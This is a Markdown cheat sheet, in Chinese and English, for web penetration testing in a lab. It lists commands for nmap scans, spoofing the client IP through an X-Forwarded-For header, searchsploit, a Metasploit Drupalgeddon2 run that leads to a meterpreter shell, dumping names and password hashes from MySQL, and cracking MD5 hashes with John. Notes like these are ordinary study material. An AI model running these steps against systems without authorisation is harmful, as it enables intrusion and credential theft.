---
title: "Web Security"
categories:
  - 技术
  - 教程
tags: [web, web Security]
sidebar: false
outline: deep
---

# Web Security

## flow

![渗透测试基本流程2](assets/渗透测试基本流程2.png)

![渗透测试基本流程1](assets/渗透测试基本流程1.png)

[How web work](../cyber/web.md#how-websites-work)

[Web Application](../cyber/WebApplication.md)

---

## nmap

[nmap介绍](../cyber/tool.md#nmap)

[端口介绍](../cyber/networkpro.md#networking-port)

```bash
# 扫描网段
nmap -sn 192.168.80.0/24 -oG -

# 检测服务版本
nmap -sV 192.168.80.22

# 扫描全端口
nmao -sS -p- 192.168.80.22

```

---

## burpsuit

[burpsuit](../security/BurpSuite.md)

<span style="font-size: 23px;">**伪造客户端IP地址**</span>

[request header](../cyber/WebApplication.md#headers-and-body)

```bash
X-Forwarded-For: 127.0.0.1
```

---

## exploit

### Exploit-db

[exploit-db](https://www.exploit-db.com/), Kali linux 官方团队维护的一个安全项目，是公认的世界上最大的搜集漏洞的数据库。

<span style="font-size: 23px;">**searchsploit**</span>

```bash
# 搜索
searchsploit drupal

# 查看路径 path
searchsploit -p 34992.py

# 拷贝到本地
searchsploit -m 34992.py

# 更新本地漏洞库
searchsploit -u
```
---

### Metasploit

[Metasploit Framework](../security/Metasploit.md) , 通常简称**MSF**。一个强大的漏洞利用和测试的综合平台，其中集成了大量的漏洞利用工具。在Kali中集成了MSF的社区版本。

**MSF初始化**

```zsh
# 开启postgresql服务
systemctl start postgresql.service

# 对MSF的数据库进行初始化
msfdb init
```

<span style="font-size: 23px;">**使用**</span>

**进入控制台**

```zsh
msfconsole
```

**msf**

```bash
msf > db_status
[*] Connected to msf. Connection type: postgresql.

msf > search drupal

msf > use 1

msf exploit(unix/webapp/drupal_drupalgeddon2) > show options

msf exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.80.128

msf exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

**meterpreter**

```bash
meterpreter > shell
```
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
---

## database

[databases](../cyber/WebApplication.md#database)

```bash
mysql -uusername -ppasswd
```
```bash
 mysql -h192.168.80.15 -uroot -ppasswd --skip-ssl
```

```sql
#查看版本
select version();

#查看当前用户
select user();

#查看当前打开的数据库
select database();

show databases;

use table_name;

show tables;

DESC users;
select name, pass from users;
```

### sql inject

[sql inject](../vuln/SqlInject.md)

---

## brutepforce

[bruteforce tools](../security/bruteforcingtools.md)

**字典去重排序**

```bash
sort -u wordlist.dic > sortedwordlist.dic
```

### John 

[John the Ripper](../crypto/john.md)

**Cracking**

```bash
john --format=raw-md5 --wordlist=/wordlists/hash-dic.txt hash-target.txt
```
**查看结果**

```bash
john --show --format=raw-md5 hash-target.txt
```

**其它**

`hash-identifier`

`john --list=formats`

---

